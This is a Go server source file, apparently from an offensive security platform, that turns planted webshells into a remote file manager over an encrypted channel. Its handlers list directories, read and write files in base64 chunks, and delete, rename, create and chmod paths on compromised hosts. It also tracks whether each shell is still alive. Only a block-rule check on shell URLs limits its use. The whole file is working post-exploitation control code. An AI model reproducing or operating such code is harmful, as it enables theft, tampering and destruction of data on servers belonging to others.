package server

import (
	"encoding/base64"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/Autumn-27/jingwei/db"
	"github.com/Autumn-27/jingwei/scanner"
)

// 大马（文件管理）走加密 v2 通道，密钥不随请求传输；路径与内容按块编码，
// 避免单条请求/响应过大触发截断。

const webshellFileBodyLimit = 2 << 20

// webshellFileTarget resolves the id, enforces the v2-only and URL guard rules,
// and rebuilds the in-memory payload for one request.
func (s *Server) webshellFileTarget(w http.ResponseWriter, r *http.Request) (*db.DB, *db.Webshell, scanner.ShellPayload, bool) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的 webshell ID")
		return nil, nil, scanner.ShellPayload{}, false
	}
	pg := s.pg(w)
	if pg == nil {
		return nil, nil, scanner.ShellPayload{}, false
	}
	shell, err := pg.GetWebshell(id)
	if err != nil {
		writeErr(w, 404, "webshell 不存在")
		return nil, nil, scanner.ShellPayload{}, false
	}
	if !strings.EqualFold(shell.Protocol, scanner.ShellProtocolV2) {
		writeErr(w, 400, "文件管理（大马）仅支持加密 v2 webshell，旧版口令壳请重新投放 v2 载荷")
		return nil, nil, scanner.ShellPayload{}, false
	}
	if strings.TrimSpace(shell.URL) == "" {
		writeErr(w, 400, "该 webshell 没有可用地址")
		return nil, nil, scanner.ShellPayload{}, false
	}
	if reason, allowed := shellAllowed(pg, shell.URL); !allowed {
		writeErr(w, 400, "webshell 地址命中资产拦截规则，已拒绝："+reason)
		return nil, nil, scanner.ShellPayload{}, false
	}
	payload, err := s.shellPayloadFor(shell)
	if err != nil {
		writeErr(w, 400, err.Error())
		return nil, nil, scanner.ShellPayload{}, false
	}
	return pg, shell, payload, true
}

func (s *Server) markWebshellFileAlive(pg *db.DB, id int64) {
	_ = pg.UpdateWebshellState(id, "alive", "", "")
}

// listWebshellFiles returns one directory listing.
func (s *Server) listWebshellFiles(w http.ResponseWriter, r *http.Request) {
	pg, shell, payload, ok := s.webshellFileTarget(w, r)
	if !ok {
		return
	}
	path := r.URL.Query().Get("path")
	if strings.ContainsRune(path, 0) {
		writeErr(w, 400, "路径包含非法字符")
		return
	}
	client := scanner.NewDeepClient(20 * time.Second)
	list, err := scanner.ListShellFiles(s.ctx, client, shell.URL, payload, path)
	if err != nil {
		writeErr(w, 502, "目录读取失败: "+shellChannelError(err))
		return
	}
	s.markWebshellFileAlive(pg, shell.ID)
	writeJSON(w, 200, map[string]any{
		"path":       list.Path,
		"parent":     list.Parent,
		"entries":    list.Entries,
		"truncated":  list.Truncated,
		"chunk_size": scanner.ShellFileChunkSize,
		"max_read":   scanner.ShellFileMaxRead,
	})
}

// readWebshellFile reads one chunk. The response carries base64 so binary
// payloads survive JSON.
func (s *Server) readWebshellFile(w http.ResponseWriter, r *http.Request) {
	pg, shell, payload, ok := s.webshellFileTarget(w, r)
	if !ok {
		return
	}
	q := r.URL.Query()
	path := q.Get("path")
	if strings.TrimSpace(path) == "" || strings.ContainsRune(path, 0) {
		writeErr(w, 400, "文件路径不能为空或包含非法字符")
		return
	}
	offset, err := strconv.ParseInt(strings.TrimSpace(q.Get("offset")), 10, 64)
	if err != nil && strings.TrimSpace(q.Get("offset")) != "" {
		writeErr(w, 400, "偏移量无效")
		return
	}
	length := scanner.ShellFileMaxRead
	if raw := strings.TrimSpace(q.Get("length")); raw != "" {
		n, perr := strconv.Atoi(raw)
		if perr != nil || n <= 0 {
			writeErr(w, 400, "读取长度无效")
			return
		}
		length = n
	}
	if length > scanner.ShellFileMaxRead {
		length = scanner.ShellFileMaxRead
	}
	client := scanner.NewDeepClient(20 * time.Second)
	chunk, err := scanner.ReadShellFile(s.ctx, client, shell.URL, payload, path, offset, length)
	if err != nil {
		writeErr(w, 502, "文件读取失败: "+shellChannelError(err))
		return
	}
	s.markWebshellFileAlive(pg, shell.ID)
	writeJSON(w, 200, map[string]any{
		"path":   chunk.Path,
		"offset": chunk.Offset,
		"size":   chunk.Size,
		"eof":    chunk.EOF,
		"bytes":  len(chunk.Data),
		"data":   base64.StdEncoding.EncodeToString(chunk.Data),
	})
}

// writeWebshellFile writes one base64-encoded chunk.
func (s *Server) writeWebshellFile(w http.ResponseWriter, r *http.Request) {
	pg, shell, payload, ok := s.webshellFileTarget(w, r)
	if !ok {
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, webshellFileBodyLimit)
	var req struct {
		Path   string `json:"path"`
		Offset int64  `json:"offset"`
		Start  bool   `json:"start"`
		Data   string `json:"data"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, "请求格式错误")
		return
	}
	if strings.TrimSpace(req.Path) == "" || strings.ContainsRune(req.Path, 0) {
		writeErr(w, 400, "文件路径不能为空或包含非法字符")
		return
	}
	raw, err := base64.StdEncoding.DecodeString(req.Data)
	if err != nil {
		writeErr(w, 400, "文件内容不是有效的 base64")
		return
	}
	if len(raw) > scanner.ShellFileChunkSize {
		writeErr(w, 400, "单次写入不能超过 256 KiB")
		return
	}
	client := scanner.NewDeepClient(30 * time.Second)
	res, err := scanner.WriteShellFile(s.ctx, client, shell.URL, payload, req.Path, req.Offset, req.Start, raw)
	if err != nil {
		writeErr(w, 502, "文件写入失败: "+shellChannelError(err))
		return
	}
	s.markWebshellFileAlive(pg, shell.ID)
	writeJSON(w, 200, map[string]any{
		"path":    res.Path,
		"offset":  res.Offset,
		"written": res.Written,
		"size":    res.Size,
	})
}

// actionWebshellFiles handles delete/rename/mkdir/chmod.
func (s *Server) actionWebshellFiles(w http.ResponseWriter, r *http.Request) {
	pg, shell, payload, ok := s.webshellFileTarget(w, r)
	if !ok {
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, webshellFileBodyLimit)
	var req struct {
		Action    string `json:"action"`
		Path      string `json:"path"`
		Target    string `json:"target"`
		Recursive bool   `json:"recursive"`
		Mode      string `json:"mode"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, "请求格式错误")
		return
	}
	client := scanner.NewDeepClient(20 * time.Second)
	var err error
	switch strings.ToLower(strings.TrimSpace(req.Action)) {
	case "delete":
		err = scanner.DeleteShellPath(s.ctx, client, shell.URL, payload, req.Path, req.Recursive)
	case "rename":
		err = scanner.RenameShellPath(s.ctx, client, shell.URL, payload, req.Path, req.Target)
	case "mkdir":
		err = scanner.MkdirShellPath(s.ctx, client, shell.URL, payload, req.Path)
	case "chmod":
		err = scanner.ChmodShellPath(s.ctx, client, shell.URL, payload, req.Path, req.Mode)
	default:
		writeErr(w, 400, "action 必须是 delete、rename、mkdir 或 chmod")
		return
	}
	if err != nil {
		writeErr(w, 502, "文件操作失败: "+shellChannelError(err))
		return
	}
	s.markWebshellFileAlive(pg, shell.ID)
	writeJSON(w, 200, map[string]any{"ok": true})
}
